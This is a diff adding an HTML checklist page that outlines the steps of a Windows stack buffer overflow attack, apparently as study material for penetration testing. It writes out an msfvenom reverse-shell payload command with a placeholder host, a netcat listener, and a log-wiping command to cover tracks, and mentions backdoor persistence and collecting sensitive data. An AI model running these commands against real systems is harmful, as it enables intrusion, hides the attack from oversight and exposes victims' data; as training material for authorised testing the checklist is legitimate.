@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buffer Overflow Checklist</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <header>
+        <h1>Buffer Overflow Checklist</h1>
+    </header>
+    <main>
+        <article>
+            <h2>Detailed Steps for Buffer Overflow Attacks</h2>
+            <ul>
+                <li><input type="checkbox" id="setup-debugger"> <label for="setup-debugger">Setup the Debugging Environment with Immunity Debugger.</label></li>
+                <li><input type="checkbox" id="pattern-create"> <label for="pattern-create">Generate a unique pattern to find EIP offset using pattern_create.rb. Command: <code>pattern_create.rb -l 3000</code></label></li>
+                <li><input type="checkbox" id="identify-offset"> <label for="identify-offset">Identify the offset that controls EIP using pattern_offset.rb. Command: <code>pattern_offset.rb -q 39694438</code></label></li>
+                <li><input type="checkbox" id="check-bad-chars"> <label for="check-bad-chars">Check for bad characters. Command: <code>!mona config -set workingfolder c:\mona\%p</code> followed by <code>!mona bytearray -b "\x00"</code></label></li>
+                <li><input type="checkbox" id="generate-payload"> <label for="generate-payload">Generate the payload avoiding bad characters using msfvenom. Command: <code>msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d"</code></label></li>
+                <li><input type="checkbox" id="test-locally"> <label for="test-locally">Test the exploit locally to ensure reliability before deployment.</label></li>
+                <li><input type="checkbox" id="execute-exploit"> <label for="execute-exploit">Execute the exploit against the target machine. Command: <code>python exploit.py x.x.x.x</code></label></li>
+                <li><input type="checkbox" id="confirm-shell-access"> <label for="confirm-shell-access">Confirm shell access and stability. Command: <code>nc -lvnp 4444</code></label></li>
+                <li><input type="checkbox" id="maintain-access"> <label for="maintain-access">Establish persistence if necessary using methods such as backdoor installation.</label></li>
+                <li><input type="checkbox" id="clear-logs"> <label for="clear-logs">Clear logs to cover tracks. Command: <code>echo '' > /var/log/auth.log</code></label></li>
+                <li><input type="checkbox" id="post-exploitation"> <label for="post-exploitation">Perform post-exploitation reconnaissance to gather further intelligence.</label></li>
+                <li><input type="checkbox" id="collect-data"> <label for="collect-data">Collect sensitive data from the target for analysis and reporting.</label></li>
+                <li><input type="checkbox" id="document-process"> <label for="document-process">Document the exploitation process in detail for reporting.</label></li>
+                <li><input type="checkbox" id="prepare-defense"> <label for="prepare-defense">Prepare to answer defensive questions related to the exploit.</label></li>
+                <li><input type="checkbox" id="analyze-effectiveness"> <label for="analyze-effectiveness">Analyze the effectiveness of the exploit and adjust as needed.</label></li>
+                <li><input type="checkbox" id="update-tools"> <label for="update-tools">Ensure all tools and scripts used are updated and fully functional.</label></li>
+                <li><input type="checkbox" id="engage-community"> <label for="engage-community">Share findings and methods with the community for feedback.</label></li>
+                <li><input type="checkbox" id="secure-backups"> <label for="secure-backups">Securely store exploit codes and data for legal compliance and future reference.</label></li>
+                <li><input type="checkbox" id="review-legal"> <label for="review-legal">Review legal implications and ensure compliance with all regulations.</label></li>
+                <li><input type="checkbox" id="finalize-report"> <label for="finalize-report">Finalize the report and prepare for submission or presentation.</label></li>
+            </ul>
+        </article>
+    </main>
+    <footer>
+        <p>Copyright 2024 WillJTools</p>
+    </footer>
+</body>
+</html>
